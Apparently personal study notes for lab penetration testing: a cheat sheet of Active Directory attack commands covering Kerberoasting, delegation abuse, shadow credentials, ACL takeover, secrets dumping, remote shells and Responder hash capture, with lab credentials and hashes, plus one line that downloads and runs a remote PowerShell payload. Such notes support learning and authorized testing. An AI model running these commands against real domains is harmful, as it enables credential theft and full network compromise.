
 

| [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                          | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.                                                                                                                                                                                                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)                                                                   | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                           |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)                                                                                            | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| evil-winrm                                                                                                                                        | Windows Remote Management spwn a shell                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView)<br> | <br>A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [PingCastle](https://www.pingcastle.com/documentation/)<br><br>                                                                                   | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                                   |
| [Group3r](https://github.com/Group3r/Group3r)                                                                                                     | finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Power Hunt Shares                                                                                                                                 | Find a file shares                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| <br>[ADRecon](https://github.com/adrecon/ADRecon)                                                                                                 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| [AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)                                                                 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| [Power Hunt Shares](https://github.com/NetSPI/PowerHuntShares)                                                                                    |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Certipy                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| targetedKerberoast                                                                                                                                |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |



```powershell 
#domain controllers
nltest /dclist:AD.it

```

**Rubeus**

```powershell

#usually 
#ask for a tgt
#add /ptt to store the ticket in the session
 ./rubeus.exe  asktgt /user:fsmith /password:Thestrokes23 /domain:EGOTISTICAL-BANK.LOCAL /dc:SAUNA.EGOTISTICAL-BANK.LOCAL /nowrap 


#@@@@ when we authticate using nrml session like username pass in evilwinrm  NOT KERBEROS meanig  non TGT session in memory @@@@

# /nowrap is purely for formatting

#Request a spn ticket
 .\Rubeus.exe kerberoast  /outfile:hashes.kerberoast
 
 #s4u 
 .\Rubeus.exe s4u /user:AttackerPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:HOST/TARGETPC.domain.local /ptt
 
 
#calculate the hash for us reutrn rc4 ....
Rubeus.exe hash /password:password123 /user:fak$ /domain:authority.htb

```

 **Impacket**
```sh
#A powerful remote command execution tool by Microsoft 
impacket-smbexec  access.offsec/svc_mssq:trustno1@192.168.133.187

impacket-wmiexec  access.offsec/svc_mssql:trustno1@192.168.133.187  

impacket-psexec  access.offsec/svc_mssql:trustno1@192.168.133.187  

#add Computer 
addcomputer.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name 'fak$' -computer-pass 'password123' -dc-ip 10.129.229.56


#RBCD
 impacket-rbcd -dc-ip 192.168.223.175 -delegate-from 'TEST$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 
 
#List AD computers  
impacket-GetADComputers  -dc-ip 192.168.223.175  resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 

#dump secrets from system and sam locally
secretsdump.py -system system -sam sam LOCAL

# MSSSQL
mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.129.45.139 
mssqlclient.py -k -no-pass  dc1.scrm.local


#query Active Directory (AD) for user information from a domain controller

GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100

# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords

GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs

#Common Service Types for Tickets :
#cifs = File sharing (SMB)
#ldap = Active Directory access
#HTTP = Web services
#HOST = General host access
#DNS = DNS services

#Full SID list with the smae Domain ID of the user 
lookupsid.py SEQUEL.HTB/ryan:'WqSZAF6CysDQbGb3'@10.129.45.247

#request TGT 
getTGT.py scrm.local/ksimpson:ksimpson -dc-ip 10.129.41.191

#export the ticket here to able to use it in most tools uing -k
export KRB5CCNAME=ksimpson.ccache

#USE DOMAIN NAME with kerberos NOT IP
smbclient.py  -k -no-pass ksimpson@dc1.scrm.local

 
```

**Powershell**
```powershell

Get-DomainUser | Where-Object {$_.Enabled -eq $true} All users Only enabled users (same object type)

Get-DomainUser | ForEach-Object {$_.SamAccountName} All users String names (different type

#Properties

Name The domain's name (what you query) `uk.eurocorp.local` The domain's own identity
Forest The forest's name (parent container) `eurocorp.local` The forest it belongs to

```

**AD Module**
```powershell 

Install-WindowsFeature -Name "RSAT-AD-PowerShell"
Import-Module ActiveDirectory
#verify
Get-Module ActiveDirectory

```

**PowerView**
```powershell

#`?`Alias for `Where-Object` Filters objects based on conditions `{ }` Script block Contains the filtering logic `$_` Current object in the pipeline Represents each item as it passes through `.IdentityReferenceName` Property name Accesses this specific property of the current object `-eq` Equality operator Checks if left side equals right side "student473"The value What were comparing against

#add -ResolveGUIDs , -Verbose parameter to resolve guids to human writable 
#Load module
powershell -ep bypass
. .\Powerview.ps1

c:\ad\tools\powerview.ps1

Import-Module <PATH> 


#Load module Remotely

iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1') 

#all commands of a module
Get-Command -Module <modulename>

#current domain
Get-NetDomain

#get object of another domain
Get-NetDomain –Domain moneycorp.local

#domain users
get-DomainUser 

#domain computer
get-DomainComputer

#domain admin
get-DomainGroup -Identity "Domain Admins"

#enum members of group
get-domainGroupMember -Identity "Domain Admins"

# Set Owner ACL to an object 
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"

#Adds an ACL for a specific active directory object.
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

#Give ACL permission to a target 
Add-DomainObjectAcl  -TargetIdentity ca_svc -Rights All
 
#Intersting ACL 
Find-InterestingDomainAcl

Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student473"}

#Forest

#trust


#request a kerberos ticket  TGS for the given SPN 
#sometimes for some reason we need to insert a cred powershell 
get-DomainSPNTicket -SPN "MSSQLSvc/DC.access.offsec"
Get-DomainSPNTicket -Credential $Cred -SPN nonexistent/BLAHBLAH 

#users wit SPN set 
get-DomainUser -SPN

# single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast


# all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

#Get GPO Permessions
Get-GPPermission -GUID 'ID' -TargetType User -TargetName 'OUR_USER'

# priv escalation checks
Invoke-AllChecks


```


**PowerHuntShares**
```powershell 
#it will generate a report 
 Invoke-HuntSMBShares  -OutputDirectory ..\labs\ -NoPing -HostList ..\labs\server.txt

```


 
 **Kerbrute**

Kerberos pre-auth to test a userlist against the DC and tells you which accounts actually exist adds automatically the domain in the wordlist


```sh
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.40.182  username.txt
```

>brute force for username using kerbrute
```
kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  -t 100
```

**evil-winrm**


```sh


#@@@@@@@@@@@@@      kerberos 
#before we need to  is the config file for the Kerberos client on your machineconfig file for the Kerberos client on your machine  `etc/krb5.conf` since it needs sit reads this file to know **where to send Kerberos requests** 
evil-winrm -i 10.129.41.191 -u MiscSvc -K ./MiscSvc.ccache -r scrm.local

#example of config kerberos in etc/krb5.config
#add
[libdefaults]
    default_realm = SCRM.LOCAL
    dns_lookup_kdc = false

[realms]
    SCRM.LOCAL = {
        kdc = dc1.scrm.local
    }

[domain_realm]
    .scrm.local = SCRM.LOCAL
    scrm.local = SCRM.LOCAL



```


 **Bloodhound**

BloodHound Legacy (To be done only after getting admin privileges)

BloodHound uses neo4j graph database, so that needs to be set up first.


> Method manual

We need to install the neo4j service. Unzip the archive C:\AD\Tools\neo4j-community-4.1.1-windows.zip 

Install and start the neo4j service as follows:

```
neo4j.bat install-service
```

```
neo4j.bat start
```

Issue with Local Admin and BloodHound Legacy -> BloodHound legacy does not show Local Admin edge in GUI. The last version where it worked was 4.0.3.


>Method docker automated 

```sh
#first time 
./bloodhound-cli install 

#usually
./bloodhound-cli start
```

Execute an Injestor  into the target machine
```powershell
#NXC
nxc ldap dc01.sequel.htb -u {USER} -p {Password} --bloodhound --collection All --dns-server {DNS}

#Sharphound
SharpHound.exe --CollectionMethods All --Domain <domainname> --DomainController <DCAddress> --LdapUsername <user> --LdapPassword <password> --ZipFileName contoso_sharphound_ldap.zip --OutputDirectory C:\Temp\SharphoundOutput

./sharphound.exe --CollectionMethod All 

sharphound.exe -c all -d active.htb --domaincontroller 10.10.10.10

#stealthier 
C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs

SharpHound.exe --CollectionMethods All           # Full sweep (noisy)
SharpHound.exe --CollectionMethods Group,LocalAdmin,Session,Trusts,ACL
SharpHound.exe --Stealth --LDAP                      # Low noise LDAP only

#Bloodhound Legacy  injestor 
#upload first the Sharphound.ps1 in PS
Invoke-BloodHound

#Python Based injestor  remote 
bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c
all --zip
#using a kerberos ticket
bloodhound-python -k -no-pass -d scrm.local -dc dc1.scrm.local -c all --auth-method kerberos -u ksimpson  -ns 10.129.41.191


```

- then we will see bloodhound.zip file
- upload the zip file inside the neo4j server  or bloodhound
- search for a specific known user if not go to search pre-build queries  and  click on shortest path from kerberostable users 

>Dump Remotely from the kali connecting remotely to the machine
```
bloodhound-python -u [usename] -p [password] -ns $ip  -d [domain] -c all
```




**responder**

LMNR for capturing hashes 
```
responder -I eth0 -rdwv 

https://github.com/Greenwolf/ntlm_theft
```



 **PingCastle**

performs a **health-check** of Active Directory and generates an HTML report with risk scoring.


```powershell
PingCastle.exe --healthcheck --server corp.local --user bob --password "P@ssw0rd!"
```


**ADExplorer**

(Sysinternals) is an advanced **AD viewer & editor** which allows:

- GUI browsing of the directory tree
- Editing of object attributes & security descriptors
- Snapshot creation / comparison for offline analysis


 **ADRecon**
 extracts a large set of artifacts from a domain (ACLs, GPOs, trusts, CA templates …) and produces an **Excel report**.

powershell

```powershell
# On a Windows host in the domain
PS C:\> .\ADRecon.ps1 -OutputDir C:\Temp\ADRecon
```


 **Enum4Linux**

Enum4linux helps you find details about a Windows machine, such as users, groups, shared folders, and other network information, by asking the Windows file-sharing service (SMB) questions.

```sh
#-a Do all simple enumeration (-U -S -G -P -r -o -n -i).

enum4linux -a $IP 

```


**Certipy** 

```sh
#Shadow Credentials
#attacker abuses the `msDS-KeyCredentialLink` attribute to add their own certificate-based authentication method to another AD account

certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51


#if you only have the cert, use it to request a TGT (PKINIT), then run bloodhound-python with that ticket
certipy auth -pfx legacyy_dev_auth.pfx -dc-ip <dc-ip>

```


**nxc**

```sh
nxc ldap 10.129.38.148 -u support -p 'Ironside47pleasure40Watchful' --bloodhound -c All --dns-server 10.129.38.148

#You hand the tool the password and `-k`, and it requests the TGT itself, in-memory, then uses it
nxc smb <DOMAIn> -u ksimpson -p 'password' -k

#using kerberos and injected ticket to enum 
nxc smb 10.129.41.191 -k --use-kcache

```


**targetedKerberoast**

 a Python script that can, like many others (e.g. [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)), print "kerberoast" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the `servicePrincipalName` attribute), print the "kerberoast" hash, and delete the temporary SPN set for that operation.

```sh
python3 targetedKerberoast.py -v -d administrator.htb -u olivia -p 'ichliebedich'
```


Check references 

https://netwerklabs.com/powerview-cheat-sheet/